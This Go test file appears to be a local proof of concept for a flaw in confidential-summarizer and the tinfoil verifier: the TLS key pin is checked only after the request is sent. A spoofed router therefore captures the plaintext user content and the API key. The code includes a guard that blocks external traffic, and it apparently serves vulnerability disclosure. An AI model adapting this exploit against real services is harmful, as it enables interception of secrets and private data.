package main

// Independent local PoC for candidate L4-summarizer-postsend-pin.
//
// Exercises the SHIPPED code path of confidential-summarizer v0.1.15
// (go.mod: tinfoil-go v0.11.3 -> verifier v0.11.2, openai-go v3.16.0):
//
//   POST /summarize (summaryService.ServeHTTP, service.go)
//     -> openAIUpstream.Summarize (upstream.go)
//     -> openai-go Chat.Completions.New  (Authorization: Bearer TINFOIL_API_KEY)
//     -> tinfoil-go v0.11.3 reVerifyingTransport.RoundTrip (tinfoil_client.go:25)
//     -> verifier v0.11.2 TLSBoundRoundTripper.RoundTrip (client/roundtrip.go:22)
//     -> http.DefaultTransport.RoundTrip  (request fully written HERE)
//     -> pin compared against resp.TLS only afterwards (roundtrip.go:36-41)
//
// Only stand-ins:
//  * SSL_CERT_FILE/SSL_CERT_DIR (set by the shell) = a test CA, standing in for
//    "the attacker holds a publicly-trusted cert for the router hostname".
//  * The router SecureClient's ground truth is injected (as a successful
//    Verify() would leave it) because Verify() needs production network.
//  * http.DefaultTransport.DialContext is replaced by a guard that routes ONLY
//    router.inf6.tinfoil.sh:443 to a local listener (emulating the network/host
//    attacker's routing control) and BLOCKS every other destination, so nothing
//    leaves this machine (re-verification attempts are blocked and logged).

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"
	"unsafe"

	log "github.com/sirupsen/logrus"
	"github.com/tinfoilsh/tinfoil-go"
	"github.com/tinfoilsh/verifier/attestation"
	verifierclient "github.com/tinfoilsh/verifier/client"

	"github.com/tinfoilsh/confidential-summarizer/config"
)

const (
	pocRouterHost = "router.inf6.tinfoil.sh"
	pocRouterRepo = "tinfoilsh/confidential-model-router" // verifier v0.11.2 defaultRouterRepo
	pocAPIKey     = "tk_SUMMARIZER_SERVICE_SECRET_API_KEY"
	pocPKI        = "../pki"
)

var guard struct {
	mu     sync.Mutex
	target string // where router.inf6.tinfoil.sh:443 is currently routed
	log    []string
}

func guardLog(format string, a ...any) {
	guard.mu.Lock()
	defer guard.mu.Unlock()
	guard.log = append(guard.log, fmt.Sprintf("%s "+format, append([]any{time.Now().Format("15:04:05.000000")}, a...)...))
}

func TestMain(m *testing.M) {
	if !strings.Contains(os.Getenv("SSL_CERT_FILE"), "pki/trust") {
		fmt.Println("run with SSL_CERT_FILE/SSL_CERT_DIR pointing at ../pki/trust")
		os.Exit(2)
	}
	if os.Getenv("HTTPS_PROXY") != "http://127.0.0.1:9" || os.Getenv("NO_PROXY") != pocRouterHost {
		fmt.Println("run with HTTPS_PROXY=http://127.0.0.1:9 NO_PROXY=" + pocRouterHost + " (second safety layer)")
		os.Exit(2)
	}
	dt := http.DefaultTransport.(*http.Transport)
	dt.Proxy = func(r *http.Request) (*url.URL, error) {
		u, err := http.ProxyFromEnvironment(r)
		guardLog("HTTP request to %s%s (proxy=%v)", r.URL.Host, r.URL.Path, u)
		return u, err
	}
	dt.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		guard.mu.Lock()
		target := guard.target
		guard.mu.Unlock()
		if addr == pocRouterHost+":443" && target != "" {
			guardLog("dial %s -> routed to local listener %s", addr, target)
			return (&net.Dialer{}).DialContext(ctx, "tcp", target)
		}
		guardLog("dial %s -> BLOCKED (no external traffic)", addr)
		return nil, fmt.Errorf("PoC network guard: blocked dial to %s", addr)
	}
	os.Exit(m.Run())
}

type capture struct {
	mu       sync.Mutex
	requests int
	proto    string
	path     string
	auth     string
	body     string
	at       time.Time
}

func startRouter(t *testing.T, name string) (*httptest.Server, *capture) {
	t.Helper()
	cert, err := tls.LoadX509KeyPair(pocPKI+"/"+name+".pem", pocPKI+"/"+name+".key")
	if err != nil {
		t.Fatal(err)
	}
	c := &capture{}
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		c.mu.Lock()
		c.requests++
		c.proto, c.path, c.auth, c.body, c.at = r.Proto, r.URL.Path, r.Header.Get("Authorization"), string(b), time.Now()
		c.mu.Unlock()
		guardLog("%s server received %s %s (%d body bytes)", name, r.Method, r.URL.Path, len(b))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"id":"x","object":"chat.completion","created":0,"model":"%s","choices":[{"index":0,"finish_reason":"stop","logprobs":null,"message":{"role":"assistant","content":"%s router title","refusal":null}}]}`, config.DefaultModel, name)
	}))
	srv.EnableHTTP2 = true
	srv.TLS = &tls.Config{Certificates: []tls.Certificate{cert}}
	srv.StartTLS()
	t.Cleanup(srv.Close)
	return srv, c
}

func certFP(t *testing.T, name string) string {
	t.Helper()
	raw, err := os.ReadFile(pocPKI + "/" + name + ".pem")
	if err != nil {
		t.Fatal(err)
	}
	blk, _ := pem.Decode(raw)
	cert, err := x509.ParseCertificate(blk.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	fp, err := attestation.CertPubkeyFP(cert) // same function verifier v0.11.2 uses
	if err != nil {
		t.Fatal(err)
	}
	return fp
}

// setGroundTruth leaves the SecureClient exactly as a successful Verify()
// does (client.go:220-231): groundTruth.TLSPublicKey = attested TLS key FP.
func setGroundTruth(sc *verifierclient.SecureClient, gt *verifierclient.GroundTruth) {
	f := reflect.ValueOf(sc).Elem().FieldByName("groundTruth")
	reflect.NewAt(f.Type(), unsafe.Pointer(f.UnsafeAddr())).Elem().Set(reflect.ValueOf(gt))
}

func route(addr string) {
	http.DefaultTransport.(*http.Transport).CloseIdleConnections()
	guard.mu.Lock()
	guard.target = addr
	guard.mu.Unlock()
}

func postSummarize(t *testing.T, h http.Handler, content string) *httptest.ResponseRecorder {
	t.Helper()
	body := fmt.Sprintf(`{"content":%q,"style":"title_summary"}`, content)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "/summarize", strings.NewReader(body)))
	return rec
}

func TestPoCSummarizerPostSendPinLeak(t *testing.T) {
	genuineFP := certFP(t, "genuine")
	attackerFP := certFP(t, "attacker")
	t.Logf("attested (pinned) router TLS key FP : %s", genuineFP)
	t.Logf("attacker cert key FP                : %s", attackerFP)

	genuine, genuineCap := startRouter(t, "genuine")
	attacker, attackerCap := startRouter(t, "attacker")

	// Same construction as main.go:34 newTinfoilClient -> tinfoil.NewClient ->
	// createClientFromSecureClient, starting from a verified router.
	sc := verifierclient.NewSecureClient(pocRouterHost, pocRouterRepo)
	setGroundTruth(sc, &verifierclient.GroundTruth{EnclaveHost: pocRouterHost, TLSPublicKey: genuineFP})
	tc, err := tinfoil.PoCCreateClientFromSecureClient(sc, openAIClientOptions(pocAPIKey)...)
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("client enclave=%s  (base URL https://%s/v1/)", tc.Enclave(), tc.Enclave())
	upstream := newOpenAIUpstream(tc.Client, config.DefaultModel)
	logger := log.New()
	logger.SetOutput(io.Discard)
	service := newSummaryService(upstream, defaultUpstreamTimeout, logger)
	mux := http.NewServeMux() // as main.go:41-46
	mux.Handle("/summarize", service)

	// --- Positive control: genuine router (pinned key) ---
	route(genuine.Listener.Addr().String())
	rec := postSummarize(t, mux, "control request, harmless text")
	t.Logf("[control] summarizer -> %d %s", rec.Code, strings.TrimSpace(rec.Body.String()))
	if rec.Code != 200 || genuineCap.requests != 1 {
		t.Fatalf("control failed: code=%d genuine requests=%d", rec.Code, genuineCap.requests)
	}

	// --- Attack: same hostname, chain-valid cert, NOT the attested key ---
	secret := "I was diagnosed with HIV yesterday; how do I tell my employer without losing my job?"
	route(attacker.Listener.Addr().String())
	start := time.Now()
	rec = postSummarize(t, mux, secret)
	done := time.Now()
	t.Logf("[attack] summarizer -> %d %s", rec.Code, strings.TrimSpace(rec.Body.String()))

	attackerCap.mu.Lock()
	defer attackerCap.mu.Unlock()
	t.Logf("[attack] attacker saw %d request(s): %s %s", attackerCap.requests, attackerCap.proto, attackerCap.path)
	t.Logf("[attack] attacker saw Authorization: %q", attackerCap.auth)
	t.Logf("[attack] attacker saw body: %s", attackerCap.body)
	t.Logf("[attack] attacker had plaintext %v after request start; summarizer returned error %v after start",
		attackerCap.at.Sub(start).Round(time.Microsecond), done.Sub(start).Round(time.Microsecond))

	guard.mu.Lock()
	for _, l := range guard.log {
		t.Logf("[net] %s", l)
	}
	guard.mu.Unlock()

	if rec.Code == 200 {
		t.Fatalf("summarizer accepted the attacker's response (unexpected)")
	}
	if attackerCap.requests == 0 || !strings.Contains(attackerCap.body, secret) {
		t.Fatalf("attacker did not receive the user content")
	}
	if attackerCap.auth != "Bearer "+pocAPIKey {
		t.Fatalf("attacker did not receive the API key")
	}
	t.Log("RESULT: pin mismatch detected only AFTER the full plaintext request (user content + API key) reached the non-attested peer")
}
